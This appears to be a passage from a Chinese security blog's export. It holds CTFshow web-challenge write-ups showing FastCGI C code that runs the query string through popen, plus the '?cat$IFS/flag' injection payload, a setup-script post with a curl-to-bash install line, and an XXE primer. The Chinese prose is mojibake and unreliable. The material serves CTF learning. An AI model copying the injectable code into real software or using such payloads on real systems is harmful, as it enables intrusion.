class="hljs-string">&quot;Popen Error!\n&quot;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">-2</span>;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-built_in">memset</span>(pRetMsg, <span class="hljs-number">0</span>, msg_len);<br>		<span class="hljs-comment">//get lastest result</span><br>		<span class="hljs-keyword">while</span>(<span class="hljs-built_in">fgets</span>(pRetMsg, msg_len, fp) != <span class="hljs-literal">NULL</span>)<br>		&#123;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Msg:%s&quot;</span>,pRetMsg); <span class="hljs-comment">//print all info</span><br>		&#125;<br><br>		<span class="hljs-keyword">if</span> ( (res = <span class="hljs-built_in">pclose</span>(fp)) == <span class="hljs-number">-1</span>)<br>		&#123;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;close popenerror!\n&quot;</span>);<br>			<span class="hljs-keyword">return</span> <span class="hljs-number">-3</span>;<br>		&#125;<br>		pRetMsg[<span class="hljs-built_in">strlen</span>(pRetMsg)<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> *cmd = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">char</span> a8Result[<span class="hljs-number">128</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">FCGI_Accept</span>() &gt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content-type: text/html\r\n&quot;</span><br>        <span class="hljs-string">&quot;\r\n&quot;</span><br>        <span class="hljs-string">&quot;&lt;title&gt;CTFshow&lt;/title&gt;&quot;</span><br>        <span class="hljs-string">&quot;&lt;h1&gt;where is flag?&lt;/h1&gt;&quot;</span><br>        );<br>        cmd=<span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;QUERY_STRING&quot;</span>);<br>	ret  = _System(cmd, a8Result, <span class="hljs-built_in">sizeof</span>(a8Result));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ret = %d \nresult = %s\nlength = %d \n&quot;</span>, ret, a8Result, <span class="hljs-built_in">strlen</span>(a8Result));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤</p>
<p><code>?cat$IFS/flag</code></p>
<h1 id="web464"><a href="#web464" class="headerlink" title="web464"></a>web464</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fcgi_stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br><br><span class="hljs-comment">/* just get lastest info */</span><br><span class="hljs-type">int</span> _System(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * cmd, <span class="hljs-type">char</span> *pRetMsg, <span class="hljs-type">int</span> msg_len)<br>&#123;<br>	FILE * fp;<br>	<span class="hljs-type">char</span> * p = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-type">int</span> res = <span class="hljs-number">-1</span>;<br>	<span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">NULL</span> || pRetMsg == <span class="hljs-literal">NULL</span> || msg_len &lt; <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Param Error!\n&quot;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span> ((fp = <span class="hljs-built_in">popen</span>(cmd, <span class="hljs-string">&quot;r&quot;</span>) ) == <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Popen Error!\n&quot;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">-2</span>;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-built_in">memset</span>(pRetMsg, <span class="hljs-number">0</span>, msg_len);<br>		<span class="hljs-comment">//get lastest result</span><br>		<span class="hljs-keyword">while</span>(<span class="hljs-built_in">fgets</span>(pRetMsg, msg_len, fp) != <span class="hljs-literal">NULL</span>)<br>		&#123;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Msg:%s&quot;</span>,pRetMsg); <span class="hljs-comment">//print all info</span><br>		&#125;<br><br>		<span class="hljs-keyword">if</span> ( (res = <span class="hljs-built_in">pclose</span>(fp)) == <span class="hljs-number">-1</span>)<br>		&#123;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;close popenerror!\n&quot;</span>);<br>			<span class="hljs-keyword">return</span> <span class="hljs-number">-3</span>;<br>		&#125;<br>		pRetMsg[<span class="hljs-built_in">strlen</span>(pRetMsg)<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> *cmd = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">char</span> a8Result[<span class="hljs-number">128</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">FCGI_Accept</span>() &gt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content-type: text/html\r\n&quot;</span><br>        <span class="hljs-string">&quot;\r\n&quot;</span><br>        <span class="hljs-string">&quot;&lt;title&gt;CTFshow&lt;/title&gt;&quot;</span><br>        <span class="hljs-string">&quot;&lt;h1&gt;where is flag?&lt;/h1&gt;&quot;</span><br>        );<br>        cmd=<span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;QUERY_STRING&quot;</span>);<br>	ret  = _System(cmd, a8Result, <span class="hljs-built_in">sizeof</span>(a8Result));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>ä¸ä¸Šä¸€é¢˜ç›¸æ¯”å°‘äº†è¾“å‡ºï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆåŒºåˆ«</p>
<p><code>?cat$IFS/flag</code></p>
<h1 id="web465"><a href="#web465" class="headerlink" title="web465"></a>web465</h1><p>ç»™äº†ç¼–è¯‘å¥½çš„cgiæ–‡ä»¶</p>
<p>é€†å‘å‘ç°åœ¨mainä¸­æ²¡æœ‰ç›´æ¥è°ƒç”¨<code>_System</code>ï¼ŒçŒœæµ‹éœ€è¦æº¢å‡ºåˆ°<code>_System</code>ç„¶åå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<p>ä¸è¿‡åœ°å€ä¸ç¡®å®šï¼Œæš‚æ—¶åšä¸å‡ºæ¥</p>
]]></content>
      <categories>
        <category>ctfshow-webå…¥é—¨</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
        <tag>webå…¥é—¨</tag>
      </tags>
  </entry>
  <entry>
    <title>auto_deploy.sh</title>
    <url>/posts/b9ea1bfd/</url>
    <content><![CDATA[<h1 id="auto-deploy"><a href="#auto-deploy" class="headerlink" title="auto_deploy"></a>auto_deploy</h1><p>ä¸€ä¸ªè‡ªåŠ¨éƒ¨ç½²Miscå·¥å…·çš„<del>è½»é‡</del>shè„šæœ¬<br>é—²çš„æ— èŠéšä¾¿å†™çš„å°ç©æ„<br>é€‚åˆåœ¨æ–°ç¯å¢ƒä¸­å¿«é€Ÿæ­å»ºmiscç¯å¢ƒ</p>
<p><a href="https://github.com/dr0n1/auto_deploy">é¡¹ç›®åœ°å€</a></p>
<h1 id="ç›®å‰æ”¯æŒçš„åŠŸèƒ½"><a href="#ç›®å‰æ”¯æŒçš„åŠŸèƒ½" class="headerlink" title="ç›®å‰æ”¯æŒçš„åŠŸèƒ½"></a>ç›®å‰æ”¯æŒçš„åŠŸèƒ½</h1><p>1ï¼šæ¢ç½‘ç»œæºï¼Œå…è®¸ root sshç™»å½•<br>2ï¼šå®‰è£…docker<br>3ï¼šå®‰è£…docker-compose<br>4ï¼šå®‰è£…golang<br>5ï¼šå®‰è£…java<br>6ï¼šå®‰è£…linuxä¸‹çš„éƒ¨åˆ†miscå·¥å…·ï¼Œå…·ä½“å¦‚ä¸‹</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">binwalk<br>bkcrack<br>blindwatermark<br>cloacked-pixel<br>dtmf2num<br>dwarf2json<br>exif<br>extundelete<br>f5-steganography<br>foremost<br>gaps<br>gnuplot<br>minimodem<br>montage<br>outguess<br>pycdc<br>sstv<br>steghide<br>stegosaurus<br>stegpy<br>stegseek<br>usb-mouse-pcap-visualizer<br>usbkeyboarddatahacker<br>volatility2<br>volatility3<br>webp<br>wireshark<br>zsteg<br></code></pre></td></tr></table></figure>



<h1 id="æ”¯æŒçš„ç³»ç»Ÿ"><a href="#æ”¯æŒçš„ç³»ç»Ÿ" class="headerlink" title="æ”¯æŒçš„ç³»ç»Ÿ"></a>æ”¯æŒçš„ç³»ç»Ÿ</h1><p>1ï¼šubuntu16.04&#x2F;18.04&#x2F;20.04&#x2F;22.04</p>
<p>æ¨è ubuntu20 åŠ ä»£ç†è¿è¡Œ</p>
<h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p>æœ¬è„šæœ¬å¯é‡å¤è¿è¡Œå®‰è£…<br>å·¥å…·ä¿å­˜åœ¨è¿è¡Œè„šæœ¬çš„<code>misc_tools</code>ç›®å½•ä¸‹</p>
<p>æ–¹æ³•ä¸€ï¼š<br>git clone <a href="https://github.com/dr0n1/auto_deploy">https://github.com/dr0n1/auto_deploy</a><br>chmod 777 auto_deploy.sh<br>.&#x2F;auto_deploy.sh [mode]</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">usage: ./auto_deploy.sh [mode]<br>        basics              åŸºç¡€é…ç½®(æ¢æºï¼Œvimï¼Œssh)<br>        docker              å®‰è£…docker<br>        docker-compoer      å®‰è£…docker-compose<br>        go                  å®‰è£…golang<br>        java                å®‰è£…java<br>        misc-tools          å®‰è£…miscå·¥å…·<br></code></pre></td></tr></table></figure>

<p>æ–¹æ³•äºŒï¼š<br>bash &lt;(curl -s <a href="https://raw.githubusercontent.com/dr0n1/auto_deploy/main/auto_deploy.sh">https://raw.githubusercontent.com/dr0n1/auto_deploy/main/auto_deploy.sh</a>) [mode]</p>
<p><img src="https://github.com/dr0n1/auto_deploy/blob/main/auto_deploy.gif?raw=true"></p>
<h1 id="æ›´æ–°æ—¥å¿—"><a href="#æ›´æ–°æ—¥å¿—" class="headerlink" title="æ›´æ–°æ—¥å¿—"></a>æ›´æ–°æ—¥å¿—</h1><p>V1.0: ç¬¬ä¸€ä»£è„šæœ¬<br>V1.1: å¢åŠ  python å®‰è£…æ¨¡å—<br>V1.2: ä¼˜åŒ–å®‰è£…é€»è¾‘ç­‰<br>V1.3ï¼šç§»é™¤ pythonï¼Œæ–°å¢ golang å’Œ java<br>V2.1ï¼šå¢åŠ  CTF-Misc éƒ¨åˆ†å·¥å…·çš„å®‰è£…<br>V2.2ï¼šä¼˜åŒ–å¯é‡å¤è¿è¡Œè„šæœ¬é€»è¾‘<br>V2.3ï¼šä¼˜åŒ–éƒ¨åˆ† python æ¨¡å—å®‰è£…é€»è¾‘<br>V2.4ï¼šå¢åŠ éƒ¨åˆ†miscå·¥å…·ï¼Œæ ¼å¼åŒ–ä»£ç <br>V3.1ï¼šç§»é™¤äº†centosçš„å·¥å…·æ”¯æŒï¼Œå¢åŠ golangå¤šç‰ˆæœ¬æ”¯æŒç­‰</p>
<h1 id="åç»­è®¡åˆ’"><a href="#åç»­è®¡åˆ’" class="headerlink" title="åç»­è®¡åˆ’"></a>åç»­è®¡åˆ’</h1><p>1ï¼šè®¡åˆ’å¢åŠ  web ç³»åˆ—å·¥å…·</p>
<p>æœ‰ç–‘é—®æˆ–è€…æœ‰æ›´å¥½çš„å»ºè®®è¯·è”ç³»<a href="mailto:&#49;&#57;&#x33;&#48;&#55;&#x37;&#x34;&#51;&#x37;&#x34;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;">&#49;&#57;&#x33;&#48;&#55;&#x37;&#x34;&#51;&#x37;&#x34;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;</a></p>
]]></content>
      <categories>
        <category>é¡¹ç›®</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>è„šæœ¬</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>xxeå­¦ä¹ æ€»ç»“</title>
    <url>/posts/aaf14e8/</url>
    <content><![CDATA[<h1 id="ä»XMLåˆ°XXE"><a href="#ä»XMLåˆ°XXE" class="headerlink" title="ä»XMLåˆ°XXE"></a>ä»XMLåˆ°XXE</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>ä»€ä¹ˆæ˜¯ XMLï¼Ÿ</strong><br>XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ã€‚<br>XML çš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ®ã€‚<br>XML æ˜¯ W3C çš„æ¨èæ ‡å‡†ã€‚<br>XML ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚XML è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ã€‚<br>XML è¯­è¨€æ²¡æœ‰é¢„å®šä¹‰çš„æ ‡ç­¾ã€‚</p>
<p><strong>XML å’Œ HTML ä¹‹é—´çš„å·®å¼‚</strong><br>XML ä¸æ˜¯ HTML çš„æ›¿ä»£ã€‚<br>XML å’Œ HTML ä¸ºä¸åŒçš„ç›®çš„è€Œè®¾è®¡ï¼š</p>
<blockquote>
<p>XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚<br>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚<br>HTML æ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€Œ XML æ—¨åœ¨ä¼ è¾“ä¿¡æ¯ã€‚</p>
</blockquote>
<p>XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬<code>XMLå£°æ˜</code>ã€<code>DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰</code>ã€<code>æ–‡æ¡£å…ƒç´ </code>ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XMLç”³æ˜--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-comment">&lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [  &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">heading</span>,<span class="hljs-keyword">body</span>)&gt;</span>  &lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>     &lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">head</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure>


<h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD(æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ŒDocument Type Definition )çš„ä½œç”¨æ˜¯å®šä¹‰<code>XML</code>æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—çš„åˆæ³•å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£ç»“æ„ã€‚</p>
<h3 id="DTDå¼•ç”¨æ–¹å¼"><a href="#DTDå¼•ç”¨æ–¹å¼" class="headerlink" title="DTDå¼•ç”¨æ–¹å¼"></a>DTDå¼•ç”¨æ–¹å¼</h3><p>1ï¼‰DTD å†…éƒ¨å£°æ˜<br><code>&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</code></p>
<p>2ï¼‰DTD å¤–éƒ¨å¼•ç”¨<br><code>&lt;!DOCTYPE æ ¹å…ƒç´ åç§° SYSTEM &quot;å¤–éƒ¨DTDçš„URI&quot;&gt;</code></p>
<p>3ï¼‰å¼•ç”¨å…¬å…±DTD<br><code>&lt;!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC &quot;DTDæ ‡è¯†å&quot; &quot;å…¬ç”¨DTDçš„URI&quot;&gt;</code></p>
<h3 id="DTD-å…³é”®å­—"><a href="#DTD-å…³é”®å­—" class="headerlink" title="DTD å…³é”®å­—"></a>DTD å…³é”®å­—</h3><ul>
<li>DOCTYPEï¼ˆDTDçš„å£°æ˜ï¼‰</li>
<li>ENTITYï¼ˆå®ä½“çš„å£°æ˜ï¼‰</li>
<li>SYSTEMã€PUBLICï¼ˆå¤–éƒ¨èµ„æºç”³è¯·ï¼‰</li>
<li>ELEMENTï¼ˆå®šä¹‰å…ƒç´ å£°æ˜ï¼‰</li>
</ul>
<h2 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h2><p>å®ä½“å¯ä»¥ç†è§£ä¸ºå˜é‡ï¼Œå…¶å¿…é¡»åœ¨DTDä¸­å®šä¹‰ç”³æ˜ï¼Œå¯ä»¥åœ¨æ–‡æ¡£ä¸­çš„å…¶ä»–ä½ç½®å¼•ç”¨è¯¥å˜é‡çš„å€¼ã€‚<br>å®ä½“æŒ‰ç±»å‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å››ç§ï¼š</p>
<ul>
<li>å†…ç½®å®ä½“ (Built-in entities)</li>
<li>å­—ç¬¦å®ä½“ (Character entities)</li>
<li>é€šç”¨å®ä½“&#x2F;æ™®é€šå®ä½“ (General entities)</li>
<li>å‚æ•°å®ä½“ (Parameter entities)</li>
</ul>
<p><strong>å†…ç½®å®ä½“</strong></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">&amp;ç¬¦å·: &amp;amp;<br>å•å¼•å·: &amp;apos;<br>ï¼: &amp;gt;<br>ï¼œ: &amp;lt;<br>åŒå¼•å·: &amp;quot;<br></code></pre></td></tr></table></figure>

<p><strong>å­—ç¬¦å®ä½“</strong></p>
<p>é€šå¸¸æ˜¯<code>html</code>çš„å®ä½“ç¼–ç ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;UTF-8&quot;</span> standalone = <span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">author</span>[</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">author</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">copyright</span> <span class="hljs-string">&quot;&amp;#169;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>&amp;#169</code>å³<code>Â©</code></p>
<p><strong>æ™®é€šå®ä½“</strong></p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">source-text</span> <span class="hljs-string">&quot;tutorialspoint&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>   &amp;source-text;<br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>å‚æ•°å®ä½“</strong></p>
<p>ä¾‹å¦‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ename</span> <span class="hljs-string">&quot;entity_value&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>å‚æ•°å®ä½“å¿…é¡»å…ˆå®šä¹‰å†ä½¿ç”¨ï¼Œè€Œä¸èƒ½åƒä¸€èˆ¬å®ä½“é‚£æ ·éšæ„æ”¾ç½®ã€‚</p>
<h3 id="å†…éƒ¨å®ä½“ä¸å¤–éƒ¨å®ä½“"><a href="#å†…éƒ¨å®ä½“ä¸å¤–éƒ¨å®ä½“" class="headerlink" title="å†…éƒ¨å®ä½“ä¸å¤–éƒ¨å®ä½“"></a>å†…éƒ¨å®ä½“ä¸å¤–éƒ¨å®ä½“</h3><p>å®ä½“æ ¹æ®å¼•ç”¨æ–¹å¼ï¼Œè¿˜å¯åˆ†ä¸ºå†…éƒ¨å®ä½“ä¸å¤–éƒ¨å®ä½“ã€‚</p>
<p>å†…éƒ¨å®ä½“ï¼š<br><code>&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</code></p>
<p>å¤–éƒ¨å®ä½“ï¼š<br><code>&lt;!ENTITY name SYSTEM &quot;URI/URL&quot;&gt;</code></p>
<h3 id="é€šç”¨å®ä½“å’Œå‚æ•°å®ä½“"><a href="#é€šç”¨å®ä½“å’Œå‚æ•°å®ä½“" class="headerlink" title="é€šç”¨å®ä½“å’Œå‚æ•°å®ä½“"></a>é€šç”¨å®ä½“å’Œå‚æ•°å®ä½“</h3><p>å…¶å®æŒ‰ç…§ä½¿ç”¨æ¥åˆ†ç±»ï¼Œåˆå¯ä»¥å°†å®ä½“åˆ†ä¸ºé€šç”¨å®ä½“å’Œå‚æ•°å®ä½“ã€‚</p>
<p>é€šç”¨å®ä½“ï¼š<br>ç”¨<code>&amp;å®ä½“å;</code>å¼•ç”¨çš„å®ä½“ï¼Œä»–åœ¨<code>DTD</code>ä¸­å®šä¹‰ï¼Œåœ¨<code>XML</code>æ–‡æ¡£ä¸­å¼•ç”¨</p>
<p>å‚æ•°å®ä½“ï¼š<br>ä½¿ç”¨<code>% å®ä½“å</code>åœ¨<code>DTD</code>ä¸­å®šä¹‰ï¼Œå¹¶ä¸”åªèƒ½åœ¨<code>DTD</code>ä¸­ä½¿ç”¨<code>%å®ä½“å;</code>å¼•ç”¨<br>åªæœ‰åœ¨<code>DTD</code>æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“<br>å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨</p>
<h3 id="ä¸åŒç¨‹åºæ”¯æŒçš„åè®®"><a href="#ä¸åŒç¨‹åºæ”¯æŒçš„åè®®" class="headerlink" title="ä¸åŒç¨‹åºæ”¯æŒçš„åè®®"></a>ä¸åŒç¨‹åºæ”¯æŒçš„åè®®</h3><p><img src="/img/summary/xxe-4.png"></p>
<blockquote>
<p>1.å…¶ä¸­ä»2012å¹´9æœˆå¼€å§‹ï¼ŒOracle JDKç‰ˆæœ¬ä¸­åˆ é™¤äº†å¯¹gopheræ–¹æ¡ˆçš„æ”¯æŒï¼Œåæ¥åˆæ”¯æŒçš„ç‰ˆæœ¬æ˜¯ Oracle JDK 1.7 update 7 å’Œ Oracle JDK 1.6 update 35<br>2.libxml æ˜¯ PHP çš„ xml æ”¯æŒ</p>
</blockquote>
<p>PHPæ”¯æŒçš„åè®®ä¼šæ›´å¤šä¸€äº›ï¼Œä½†éœ€è¦ä¸€å®šçš„æ‰©å±•ï¼š</p>
<p><img src="/img/summary/xxe-9.png"></p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXEæ¼æ´å…¨ç§°<code>XML External Entity Injection</code>å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚<br>XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»ç­‰å±å®³ã€‚</p>
